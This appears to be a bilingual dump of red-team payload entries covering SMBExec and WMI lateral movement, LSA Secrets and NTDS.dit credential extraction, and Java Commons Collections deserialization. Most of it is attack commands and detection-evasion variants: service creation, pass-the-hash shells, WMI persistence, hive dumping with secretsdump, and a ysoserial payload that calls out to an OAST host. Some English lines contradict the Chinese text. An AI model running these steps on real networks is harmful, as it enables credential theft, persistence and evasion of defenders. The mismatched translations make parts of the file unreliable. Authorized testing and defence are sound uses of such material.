name.zh: SMBExec 半交互执行与服务创建

description.zh: 通过 SMB 命名管道半交互执行命令，验证服务写入路径与 EDR 检测面。
description.en: Executes commands semi-interactively through the SMB service control manager by pointing a service binPath at the command interpreter and reading output from the named pipe, exercising the service-write path and its 7045 detection.

overview.zh: SMBExec 远程服务写入防护覆盖 SMB 服务控制场景：针对持有目标管理员凭据的测试主体，验证能否经 SMB 写入并启动远程服务获得命令执行。验证维度涵盖 smbexec.py 自动化半交互 shell 与 sc 原生命令手动创建、启动、删除的完整流程。
overview.en: SMBExec Remote-Service Write Protection covers SMB service control: for a test principal holding target administrator credentials, verify whether a remote service can be written and started over SMB for command execution. Verification dimensions cover the automated semi-interactive smbexec.py shell and the manual sc create/start/delete workflow.

vulnerability.zh: 根因是 ADMIN$ 共享与服务控制管理器允许管理员主体远程创建服务，服务 binPath 可指向任意命令行；smbexec 借此把命令输出经 SMB 管道回传，形成不留盘上文件的执行通道，7045 服务创建事件是主要审计痕迹。
vulnerability.en: The root cause is that the ADMIN$ share and the Service Control Manager let administrators create services remotely with binPath pointing at arbitrary command lines; smbexec pipes command output back over SMB, yielding a fileless execution channel whose primary audit trace is the 7045 service-creation event.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 smbexec.py 建立半交互 shell，命令输出经 SMB 返回即确认成功；第 2 步用 sc \HOST create/start/delete 手动复现：创建 evilsvc 指向 cmd /c whoami，启动后回收输出，再删除服务清理痕迹，目标侧对应 7045 创建与删除事件。该路径无需落盘，适合批量横向前验证凭据有效性。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 runs smbexec.py for a semi-interactive shell — command output returning over SMB confirms success; step 2 replays manually with sc \HOST create/start/delete: create evilsvc pointing at cmd /c whoami, start it to capture output, then delete the service, matching 7045 create/delete events on the target. The path is fileless and suits credential validation before batch lateral movement. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
ADMIN$ 与服务控制远程访问限管理网段专用账号，强制 SMB 签名，本地管理员隔离与 LAPS，7045 实时告警并审计 binPath：
    Set-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)" -RemoteAddress 10.0.10.0/24
    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 1 /f
    Get-WinEvent -FilterHashtable @{LogName='System';Id=7045} | ? Message -notmatch "Antivirus|Update"
    修复后用第 1、2 步样例回归，远程服务创建应被拒绝并触发告警。
mitigation.en: Restrict ADMIN$ and service-control remote access to dedicated management-segment accounts, enable SMB signing, and enforce local-admin isolation with LAPS rotation; build real-time alerts on 7045 service-creation events and audit binPath contents. After the fix, regress with the step 1 and step 2 samples: remote service creation must be denied and raise an alert.

description.zh: 确认手握目标管理员口令或 NTLM 哈希，且 445 端口可达、ADMIN$ 可写；条件齐备即可走服务创建方式横向。
description.en: Hold an admin password or NTLM hash for the target, with port 445 reachable and ADMIN$ writable; with these met, service-creation lateral movement is viable.

description.zh: 用 smbexec.py 以口令或哈希登录目标；返回管理员级半交互 shell、命令经共享目录中转即服务化横向通道建立。
description.en: Log in with smbexec.py using password or hash; an admin-level shell with commands relayed through a share establishes the service-based lateral channel.

title.zh: 原生服务落地持久执行

description.zh: 用 sc \目标 create evilsvc binPath= "cmd /c whoami" 创建服务；sc query 显示服务存在且创建成功即通道打通，随后修改 binPath 指向其他命令即可执行任意载荷。
description.en: Create evilsvc via sc \\target create ... binPath= "cmd /c whoami"; a created, runnable service only needs a new binPath to carry any payload.

attackChain.payload:
sc \\{LAB_HOST} create evilsvc binPath= "cmd /c whoami"
sc \\{LAB_HOST} start evilsvc
sc \\{LAB_HOST} delete evilsvc

description.zh: 用 sc delete 移除 evilsvc 并清理 smbexec 中转残留文件；通道用后即焚，避免巡检时发现异常服务项。
description.en: Remove evilsvc with sc delete and clear smbexec relay leftovers; burning the channel after use avoids anomalous services surfacing in inspection.

attackChain.payload:
sc \\{LAB_HOST} create evilsvc binPath= "cmd /c whoami"
sc \\{LAB_HOST} start evilsvc

description.zh: 绕过对 smbexec 默认服务名的规则匹配：伪装时间同步类服务名。成功判据：shell 建立且服务名无告警。
description.en: Evades rule matching on smbexec's default service name by masquerading as a time-sync style service. Success: shell establishes with no alert on the service name.

title.zh: 环境变量路径混淆规避变体 — 绕过 binPath 直接 cmd.exe 的服务创建检测

wafBypass.command: sc \\{LAB_HOST} create W32Sync binPath= "%COMSPEC% /c whoami > C:\Windows\Temp\s.txt" && sc \\{LAB_HOST} start W32Sync

description.zh: 环境变量路径混淆规避变体 — 绕过对 binPath 中明文 cmd.exe 的服务创建检测：以 %COMSPEC% 环境变量间接指向命令解释器，静态特征不含 cmd.exe 字样。成功判据：服务启动且 C:\Windows\Temp\s.txt 生成。
description.en: Evades service-creation detection on a direct cmd.exe binPath by wrapping indirect launch through rundll32. Success: service starts and the command executes.

explanation.zh: 服务执行路径经环境变量混淆
explanation.en: service path obfuscated via environment variable

explanation.zh: cmd.exe 绝对路径环境变量

wafBypass.command: net use \\{LAB_HOST}\C$ /user:{LAB_DOMAIN}\{LAB_USER} {LAB_PASSWORD} && copy output.bat \\{LAB_HOST}\C$\Windows\Temp\ && sc \\{LAB_HOST} create SysH binPath= "cmd /c C:\Windows\Temp\output.bat"

description.zh: 共享通道切换规避变体 — 绕过针对 ADMIN$ 的落盘监控：脚本改经 C$ 管理共享写入目标临时目录，服务 binPath 指向本地路径执行，不触碰 ADMIN$。成功判据：output.bat 成功写入目标 C$ 且 SysH 服务启动执行。
description.en: Evades admin$-specific drop monitoring by delivering the script over the IPC$ named-pipe share instead. Success: the script executes via IPC$.

description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_SMBEXEC_E_1 with blue-team logs; a semi-interactive shell with command output returned over SMB confirms success.

name.zh: WMI 远程管理授权验证

description.zh: 通过 WMI（wmic/Invoke-CimMethod）远程执行管理操作，验证管理协议的授权与遥测覆盖。
description.en: Runs management operations remotely through WMI (wmic or Invoke-CimMethod) such as Win32_Process.Create, showing the protocol executes without dropping any file and detection depends on process-creation and WMI activity logging.

overview.zh: WMI 远程管理授权验证覆盖 DCOM/WMI 远程执行场景：针对持有凭据或哈希的测试主体，验证能否经 135 端口调用 Win32_Process 在目标创建进程。验证维度涵盖 wmic 单命令、wmiexec 交互 shell、哈希传递与 PowerShell 原生调用四种路径。
overview.en: WMI Remote-Management Authorization Validation covers DCOM/WMI remote execution: for a test principal holding credentials or a hash, verify whether Win32_Process can be invoked over port 135 to create a process on the target. Verification dimensions cover single-command wmic, an interactive wmiexec shell, pass-the-hash, and native PowerShell invocation.

vulnerability.zh: 根因是 WMI/DCOM 默认允许管理员组主体远程调用 Win32_Process.Create；口令弱化或哈希泄露后，攻击者无需向目标落盘任何工具即可拉起进程，行为混入正常 WMI 活动，检测依赖 4688 进程与 5857 WMI 活动事件关联。
vulnerability.en: The root cause is that WMI/DCOM by default lets administrators invoke Win32_Process.Create remotely; with weak passwords or leaked hashes, an attacker launches processes without dropping any tool on the target, and the activity blends into normal WMI traffic, making detection dependent on correlating 4688 process events with 5857 WMI activity.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 wmic 远程创建 cmd /c whoami 进程，返回 ReturnValue 0 与 ProcessId（命令输出需转存文件或共享取回）且目标侧出现 4688/5857 事件即确认成功；第 2 步进入 wmiexec 交互 shell 验证持续控制能力；第 3 步改用 -hashes 以 NTLM 哈希完成认证再取 shell；第 4 步先以 $cred = Get-Credential 构造凭据对象，再用 Invoke-WmiMethod 复现，ReturnValue 0 且目标出现新进程即确认。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 remotely creates a cmd /c whoami process with wmic — returned hostname output plus 4688/5857 events on the target confirms success; step 2 enters an interactive wmiexec shell to verify sustained control; step 3 switches to -hashes to authenticate with the NTLM hash and obtain a shell; step 4 replays with Invoke-WmiMethod — ReturnValue 0 plus a new process on the target confirms. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
WMI/DCOM 远程访问限制到管理网段与跳板机，收紧 WMI 命名空间与 DCOM 激活权限，监控 Win32_Process.Create 与 5857/4688 事件：
    New-NetFirewallRule -DisplayName "Block-RPC-WMI" -Direction Inbound -Action Block `
      -Protocol TCP -LocalPort 135 -RemoteAddress Any
    reg add HKLM\SOFTWARE\Microsoft\Ole /v EnableDCOM /t REG_SZ /d "N" /f   # 评估业务后禁用远程 DCOM
    AuditPol /set /subcategory:"Process Creation" /success:enable /failure:enable
    修复后用第 1、4 步样例回归，远程进程创建应返回拒绝错误。
mitigation.en: Restrict WMI/DCOM remote access to the management segment and jump hosts, tighten WMI namespace and DCOM launch permissions, and disable unnecessary remote WMI features; monitor Win32_Process.Create calls and 5857/4688 events. After the fix, regress with the step 1 and step 4 samples: remote process creation must return an access-denied error.

description.zh: 用 wmic /node:目标 process call create 启动回连命令；目标进程列表出现新进程即 WMI 远程执行可用且无文件落地。
description.en: Use wmic /node:target process call create to start a callback command; the new process appearing on the target shows WMI remote execution works without file drops.

title.en: Open an interactive channel with wmiexec

description.zh: 运行 wmiexec.py 以口令登录目标；返回管理员级半交互 shell 即建立稳定横向通道，可连续执行命令。
description.en: Run wmiexec.py with credentials; an admin-level semi-interactive shell establishes a stable lateral channel for continuous commands.

description.zh: 以 -hashes 方式重跑 wmiexec；同样拿到 shell 即 NTLM 哈希在 WMI 通道有效，可横向到仅握有哈希的主机。
description.en: Re-run wmiexec with -hashes; the same shell proves the NTLM hash works over WMI, extending reach to hash-only hosts.

title.en: Fan out with native PowerShell WMI

description.zh: 用 Invoke-WmiMethod 调 Win32_Process.Create 在域内批量下发命令；各目标返回 ProcessId 即完成无第三方二进制的批量横向。
description.en: Use Invoke-WmiMethod with Win32_Process.Create to fan commands across the domain; ProcessId returns from each target complete tool-free batch execution.

opsecTips.zh: WMI 执行无落盘但留 4688/5857 痕迹——保持单机单命令节奏，不对域控直接执行管理操作。
opsecTips.en: WMI execution leaves no file but 4688/5857 traces — keep a one-host one-command pace and never run management operations directly against domain controllers.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 wmic.exe 弃用遥测与进程链检测（wmic.exe→子进程特征）：用 PowerShell CIM 直连 WMI 服务。成功判据：进程创建成功且父进程非 wmic.exe。
description.en: Evades deprecated wmic.exe telemetry and process-chain detection (wmic.exe→child signature) by using PowerShell CIM to reach the WMI service directly. Success: process creation succeeds with a non-wmic parent.

title.zh: 事件订阅持久化规避变体

wafBypass.command: $filter=Set-WmiInstance -ComputerName {LAB_HOST} -Credential $cred -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SysHealth';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer=Set-WmiInstance -ComputerName {LAB_HOST} -Credential $cred -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SysHealth';CommandLineTemplate='cmd /c whoami > C:\Windows\Temp\w.log'}; Set-WmiInstance -ComputerName {LAB_HOST} -Credential $cred -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}

description.zh: 绕过一次性 wmiexec 会话的 4648/进程创建告警：改用事件订阅延迟触发，无即时进程链关联。成功判据：60 秒内 w.log 生成且无即时父进程关联。
description.en: Evades one-shot wmiexec session alerts (4648/process creation) by switching to an event subscription that fires later with no immediate parent correlation. Success: w.log appears within 60s without an immediate parent chain.

title.zh: 共享输出回读规避变体

description.zh: 绕过 WMI 输出通道监控：结果重定向共享，规避 stdout 编码回传特征。成功判据：w.txt 含执行身份。
description.en: Evades WMI output-channel monitoring by redirecting results to a share instead of the encoded stdout return path. Success: w.txt contains the execution identity.

title.en: WMI Remote-Management Authorization Validation Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_WMI_E_1 与蓝队日志；成功时 wmic 返回 ReturnValue = 0 与新进程 ProcessId（whoami 输出需经重定向文件或共享取回），蓝队可见 4688/5857 WMI 活动事件。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_1 with blue-team logs; the target creating a cmd /c whoami process and returning output, with events 4688/5857, confirms success.

explanation.en: Describes how the parameter segment "/node:" participates in this validation command.
Describes how the parameter segment "/user:" participates in this validation command.

title.en: WMI Remote-Management Authorization Validation Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_WMI_E_2 与蓝队日志；成功时进入 wmiexec 交互 shell，命令输出正常返回。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_2 with blue-team logs; entering a wmiexec interactive shell with normal command output confirms success.

title.en: WMI Remote-Management Authorization Validation Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_WMI_E_3 与蓝队日志；成功时以 NTLM 哈希完成 WMI 认证并取得交互 shell。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_3 with blue-team logs; WMI authentication with the NTLM hash yielding an interactive shell confirms success.

title.en: WMI Remote-Management Authorization Validation Reviewed Command 4

description.zh: 先运行 $cred = Get-Credential {LAB_DOMAIN}\{LAB_USER} 构造凭据对象，再在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_WMI_E_4 与蓝队日志；成功时 Invoke-WmiMethod 返回 ReturnValue 0 且目标出现新进程。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_4 with blue-team logs; Invoke-WmiMethod returning ReturnValue 0 with a new process on the target confirms success.

name.zh: LSA Secrets 提取

description.zh: 读取 LSA Secrets 注册表存储，验证服务账号口令与自动登录凭据的暴露面。
description.en: Reads the LSA Secrets registry storage and decrypts service-account passwords, auto-logon credentials, and cached keys offline, verifying the exposure of machine-local secrets to privileged processes.

subCategory.zh: 域凭据与 LSA 提取

overview.zh: 该 Payload 覆盖 LSA Secrets 存储边界审计场景，检验服务账号密文与自动登录凭据的可提取路径。验证维度含 Mimikatz 直读、配置单元导出与离线解析三步，对应第 1 至第 3 步。
overview.en: This payload covers LSA Secrets storage-boundary auditing, testing extraction paths for service-account secrets and autologon credentials. Validation covers direct Mimikatz reads, hive export and offline parsing, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 LSA Secrets 以可被高权限进程还原的方式加密存储：服务账户口令、自动登录凭据与缓存密钥均可经注册表导出加离线解密取得明文。
vulnerability.en: The root cause is LSA Secrets stored encrypted but recoverable by high-privilege processes: service-account passwords, autologon credentials and cached keys all yield plaintext through registry export plus offline decryption.

exploitation.zh: 第 1 步用 mimikatz 的 lsadump::secrets 直读，输出服务账号明文或哈希即提取成功；第 2 步用 reg save 同时导出 SECURITY 与 SYSTEM 配置单元；第 3 步以 secretsdump.py 的 LOCAL 模式离线解析两份 hive，还原密钥明文即确认第二条路径同样可达。以任一路径明文产出为成功判据。占位符在全局变量菜单替换；导出文件测试后销毁。
exploitation.en: In step 1, read directly with mimikatz lsadump::secrets; service-account plaintext or hashes mark extraction success. In step 2, export the SECURITY and SYSTEM hives together with reg save. In step 3, parse both hives offline with secretsdump.py LOCAL mode; recovered plaintext proves the second path is equally reachable. Judge success by plaintext output from either path. Replace placeholders via the global variables menu; destroy exported files after testing.

mitigation.zh:
服务账号改用 gMSA，禁用自动登录并清理遗留 LSA 密文，启用 LSA 保护并监控 reg save 对 SECURITY 键的访问：
    New-ADServiceAccount -Name svc_task -DNSHostName svc_task.corp.local `
      -PrincipalsAllowedToRetrieveManagedPassword "CORP\Servers"
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 0 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
    修复后重放第 1、2 步，读取应被阻断并产生告警。
mitigation.en: Move service accounts to gMSA, disable autologon, purge legacy LSA secrets, and monitor reg save access to the SECURITY key. After the fix, replay steps 1 and 2: reads should be blocked with alerts.

description.zh: 用 mimikatz 的 lsadump::secrets 直接读取 LSA 保护数据；输出服务账号口令与自动登录凭据即拿到本机保存的高价值秘密，可直接复用。
description.en: Read LSA-protected data directly with lsadump::secrets; service passwords and autologon credentials come out in plaintext ready for reuse.

title.zh: 导出注册表 hive 备用

description.zh: 用 reg save 导出 SECURITY 与 SYSTEM 两个配置单元；文件落盘即备好离线解析材料，适合规避内存扫描或需要转移数据的场景。
description.en: Save the SECURITY and SYSTEM hives with reg save; offline copies suit environments where memory scanning is a concern or data must be exfiltrated.

attackChain.payload:
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive

description.zh: 用 secretsdump.py 以 security 与 system 参数离线解析导出的 hive；输出 DPAPI 域备份密钥与服务明文口令即完成 LSA 凭据收割闭环。
description.en: Parse the exported hives with secretsdump.py -security -system LOCAL; DPAPI domain backup keys and plaintext service passwords close out the harvest.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 LSA Secrets 存储边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for LSA Secrets Storage-Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: LSA Secrets 存储边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: LSA Secrets Storage-Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 提取的服务账户口令与自动登录凭据验证后即毁；注册表导出走离线 hive 而非在线改动。
opsecTips.en: Destroy extracted service-account passwords and auto-logon secrets after verification, and export offline hives instead of modifying the live registry.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 离线 hive 解析规避变体

wafBypass.command: reg save HKLM\SECURITY sec.hive && reg save HKLM\SYSTEM sys.hive && secretsdump.py -security sec.hive -system sys.hive LOCAL

description.zh: 绕过目标内存操作检测（mimikatz 进程特征）：reg 导出后离线解析，目标侧仅两个导出动作。成功判据：离线输出 LSA secrets。
description.en: Evades in-memory operation detection (mimikatz process signatures) by exporting hives and parsing offline, leaving only two export actions on the target. Success: LSA secrets come out offline.

title.zh: DPAPI_SYSTEM 分离提取规避变体

wafBypass.command: reg save HKLM\SECURITY sec2.hive && secretsdump.py -security sec2.hive -system sys.hive LOCAL | Select-String 'DPAPI_SYSTEM|DefaultPassword|MACHINE.ACC'

description.zh: 绕过全量 secrets 输出的 DLP 特征：过滤仅保留机器账号与 DPAPI 键。成功判据：输出仅含目标键值。
description.en: Evades DLP signatures on full secrets output by filtering to machine account and DPAPI keys only. Success: output contains only the targeted values.

title.zh: 卷影只读提取规避变体

wafBypass.command: vssadmin create shadow /for=C: 2>nul & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SECURITY C:\Windows\Temp\s.hive & secretsdump.py -security s.hive -system sys.hive LOCAL

description.zh: 绕过注册表实时监控对 SECURITY 键访问的告警：经卷影副本只读提取。成功判据：s.hive 解析出 LSA secrets。
description.en: Evades live registry monitoring of SECURITY key access by extracting read-only through a shadow copy. Success: s.hive parses into LSA secrets.

description.zh: 用 Mimikatz 提取 LSA Secrets；输出服务账号与明文或哈希密文即提取成功。
description.en: Extract LSA Secrets with Mimikatz; printed service accounts with plaintext or hash material means extraction succeeded.

execution.command:
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive

description.zh: 导出 SECURITY 与 SYSTEM 配置单元；当前目录生成两个 hive 即导出成功，供离线解析。
description.en: Export the SECURITY and SYSTEM hives; both hives in the current directory mean the export succeeded for offline parsing.

description.zh: 用 Impacket 离线解析 LSA Secrets；输出密钥明文即解析成功。
description.en: Parse LSA Secrets offline with Impacket; printed secret plaintexts mean parsing succeeded.

name.zh: Java 原生反序列化与 Commons Collections Gadget
name.en: Java Deserialization with Commons Collections Gadgets

description.zh: 验证外部 Java 序列化流是否进入 ObjectInputStream，并借类路径中的 Commons Collections 等 Gadget 在 readObject 阶段触发非预期方法链。版本边界：CommonsCollections 链可用性受 JDK 版本约束——CC1/CC3 依赖 AnnotationInvocationHandler 旧结构，仅 JDK < 8u71 可用；CC6 不依赖该结构但仍受 JDK 8u121+ 的 JEP 290 反序列化过滤限制。验证前先核对目标 JDK 版本与 Commons Collections 依赖。
description.en: Validate whether an external Java serialization stream reaches ObjectInputStream and uses gadgets such as Commons Collections on the classpath to trigger unintended method chains during readObject. Version boundary: CommonsCollections chain availability tracks the JDK — CC1/CC3 rely on the pre-8u71 AnnotationInvocationHandler structure, while CC6 avoids it but stays constrained by the JEP 290 deserialization filter on JDK 8u121+. Check the target JDK and the Commons Collections dependency before attempting.

overview.zh: Java 原生反序列化与 Commons Collections Gadget 针对外部序列化流进入 ObjectInputStream 的场景：类路径中的 Gadget 在 readObject 阶段触发非预期方法链。验证十六进制序列化流的目标接受与行为差异。
overview.en: Java native deserialization with Commons Collections gadgets targets external streams entering ObjectInputStream, where classpath gadgets trigger unexpected method chains during readObject. It validates target acceptance and behavioral differences of hex-encoded serialization streams.

vulnerability.zh: ObjectInputStream 会根据流中的类信息恢复对象并调用 readObject、readResolve 等生命周期方法；应用若接受不可信流且类路径包含可组合的反射、转换器或集合 Gadget，副作用可能在业务类型检查之前执行。
vulnerability.en: ObjectInputStream restores objects from in-stream class descriptors and invokes lifecycle methods like readObject and readResolve; if the application accepts untrusted streams while the classpath holds composable reflection, transformer, or collection gadgets, side effects can execute before business type checks.

exploitation.zh: 先用 ysoserial 等工具把第 1 步的 Commons Collections 链生成为十六进制序列化流（aced0005 开头），再逐条提交到目标反序列化点；命中判据为反序列化后行为与基线出现差异（异常、延迟或命令副作用）。先确认入口接受序列化字节并记录响应差异，再区分魔数识别、类恢复、gadget 触发与最终副作用四个阶段；建议先用 ysoserial 生成的标记命令载荷对照，确认哪条链在当前类路径可用。
exploitation.en: Per step 1, submit the hex-encoded serialization streams (aced0005-prefixed) to the target deserialization point one by one; a hit is post-deserialization behavior diverging from the baseline (exceptions, delays, or command side effects). First confirm the entry accepts serialized bytes and record response differences, then keep the four stages distinct—magic recognition, class restoration, gadget triggering, and final side effects; compare against ysoserial-generated marker-command payloads to identify which chain works on the current classpath.

mitigation.en: Stop native Java serialization across trust boundaries and migrate to explicit data protocols; during migration configure process-level and stream-level ObjectInputFilters allowing only minimal business types, depth, references, and byte counts; remove unneeded gadget dependencies, keep upgrading, isolate deserialization, and monitor rejections and anomalous class loading. After the fix, replay the step-1 streams and confirm filter rejection.

title.zh: 核对 ObjectInputStream 与类路径

description.zh: 确认字节确实进入 Java 原生反序列化，并枚举运行时 Gadget 依赖及过滤器状态。
description.en: Confirm bytes reach native Java deserialization and inventory runtime gadget dependencies and filter state.

title.zh: 记录 Gadget 解析证据

description.zh: 在隔离 JVM 输入原始语料，采集类解析、过滤器决策、异常栈与受控回调。
description.en: Feed the original corpus to an isolated JVM and capture class resolution, filter decisions, stack traces, and controlled callbacks.

title.zh: 启用序列化过滤并迁移

description.zh: 应用严格过滤器并替换数据协议后，重放正常 DTO 和危险流，确认兼容数据通过而 Gadget 类被拒绝。
description.en: After applying strict filters and replacing the protocol, replay valid DTOs and dangerous streams to confirm compatible data passes while gadget classes are rejected.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 外部 Java 序列化字节进入 ObjectInputStream.readObject，JDK、序列化过滤器和 Commons Collections 等实际类路径版本均可核验。
prerequisites.en: External Java serialization bytes reach ObjectInputStream.readObject, with JDK, serialization filters, and actual classpath versions such as Commons Collections verifiable.

prerequisites.zh: 先离线解析源十六进制流的类描述符，确认多数行是头/普通类片段；真实验证使用只调用固定 marker 的测试 Gadget，而非命令链。
prerequisites.en: Source hexadecimal streams are parsed offline to identify class descriptors and confirm that many lines are headers or ordinary class fragments; live validation uses a test gadget that calls only a fixed marker rather than a command chain.

analysis.zh: 阳性证据是完整可控对象图被目标 ObjectInputStream 实例化，并通过目标类路径上的已确认 Gadget 调用测试 marker；输入头或类名本身不够。 假阳性边界：aced0005 魔数、HashMap/JarFile/URL 类名、反序列化成功返回普通集合、InvalidClassException、过滤器拒绝或 ysoserial 能生成别的链均不是当前 RCE。
analysis.en: Positive evidence requires a complete controlled object graph to be instantiated by the target ObjectInputStream and invoke the test marker through a confirmed gadget on the target classpath; stream headers or class names alone are insufficient. False-positive boundary: The aced0005 magic, HashMap, JarFile, or URL class names, successful deserialization into an ordinary collection, InvalidClassException, filter rejection, or ysoserial generating another chain does not prove this RCE.

opsecTips.zh: Java 反序列化验证禁止执行真实 Commons Collections 命令 Gadget；出现进程、JNDI/网络、文件写入、类加载异常或 JVM 不稳定时停止。
opsecTips.en: Java deserialization validation never executes a real Commons Collections command gadget; stop on processes, JNDI or network access, file writes, class-loading anomalies, or JVM instability.

opsecTips.zh: 销毁隔离 JVM，删除对象流、marker 和临时类，清理消息队列/会话缓存，恢复 ObjectInputFilter 并重启测试服务。
opsecTips.en: Destroy the isolated JVM, delete object streams, markers, and temporary classes, clear message queues and session caches, restore ObjectInputFilter, and restart the test service.

description.zh: 绕过对 aced0005 十六进制魔数特征的检测：以 base64 形态传输序列化流；成功判据：{ATTACKER_HOST} 收到 cc6 回连。
description.en: Evades detection of the aced0005 hex magic by transporting the stream as base64. Success: cc6 callback reaches {ATTACKER_HOST}.

wafBypass.command: java -jar ysoserial.jar CommonsCollections5 'curl http://{LAB_OAST}/cc5-probe' | gzip > payload.gz

description.zh: 序列化流 gzip 压缩后 aced0005 魔数与 gadget 结构均不可见；成功判据：目标反序列化时执行命令并回连 {ATTACKER_HOST}。
description.en: Gzipping hides both the magic bytes and gadget structure. Success: target executes id on deserialization (verify via DNS/OAST).

description.zh: 改用 CB1 链规避仅覆盖 CommonsCollections 类名的规则，十六进制输出绕过 base64 特征；成功判据：DNSLog 收到解析。
description.en: Swaps to the CB1 chain to dodge rules matching only CommonsCollections class names, with hex output to avoid base64 signatures. Success: DNSLog receives the query.

title.en: Validation step 1 for Java Deserialization with Commons Collections Gadgets

description.zh: Java反序列化 (Commons Collections)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：反序列化后行为与基线出现差异（异常、延迟或命令副作用）。
description.en: Run this Java Deserialization with Commons Collections Gadgets validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: deserialization diverges from the baseline (exception, delay, or command side effect).

name.zh: NTDS.dit 备份与访问边界审计

description.zh: 通过 ntdsutil、卷影副本或 DCSync 提取 NTDS.dit，验证域控数据库的访问与备份边界。
description.en: Extracts NTDS.dit through ntdsutil, a volume shadow copy, or DCSync to show the domain database's backup and replication path delivers every domain hash, including krbtgt, in one step.

subCategory.zh: 域凭据与 LSA 提取

overview.zh: 该 Payload 覆盖 NTDS.dit 备份与访问边界审计场景，检验域数据库文件的提取路径与 DCSync 复制面。验证维度含 ntdsutil 快照、卷影复制、离线解析与两步远程 DCSync，对应第 1 至第 5 步。
overview.en: This payload covers NTDS.dit backup and access-boundary auditing, testing extraction paths for the domain database and the DCSync replication surface. Validation covers an ntdsutil snapshot, shadow copying, offline parsing, and two remote DCSync steps, mapped to steps 1 through 5.

vulnerability.zh: 根因在于域控本地管理员与具备复制权限的账户可以导出 NTDS.dit 或模拟复制流程：一旦路径可达，全部域账户哈希含 krbtgt 即被一次性拖走。
vulnerability.en: The root cause is domain-local administrators and accounts with replication rights being able to export NTDS.dit or emulate replication: once a path is reachable, every domain hash including krbtgt is exfiltrated at once.

exploitation.zh: 第 1 步用 ntdsutil 的 ifm 模式创建完整快照；第 2 步经卷影副本复制 NTDS.dit 验证第二路径；第 3 步以 secretsdump.py LOCAL 模式解析出域账户哈希；第 4 步用复制权限测试账号执行 just-dc 远程同步；第 5 步以 mimikatz dcsync 对照确认。任一路径产出 krbtgt 哈希即确认边界失守。占位符在全局变量菜单替换；仅限授权域。
exploitation.en: In step 1, create a full snapshot with ntdsutil ifm mode. In step 2, copy NTDS.dit via shadow copy validating the second path. In step 3, parse domain hashes with secretsdump.py LOCAL mode. In step 4, run just-dc remotely with a replication-authorized test account. In step 5, cross-confirm with mimikatz dcsync. Any path yielding the krbtgt hash confirms the boundary breach. Replace placeholders via the global variables menu; authorized domains only.

mitigation.zh:
清理域控本地管理员成员并按需委派复制权限，移除非特权主体的复制扩展权限，对 DCSync（4662）与卷影操作建立高等级告警：
    dsacls "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local" /R "CORP\Helpdesk"
    # 移除 DS-Replication-Get-Changes(-All) 扩展权限（GUID 1131f6aa/1131f6ad）
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4662} |
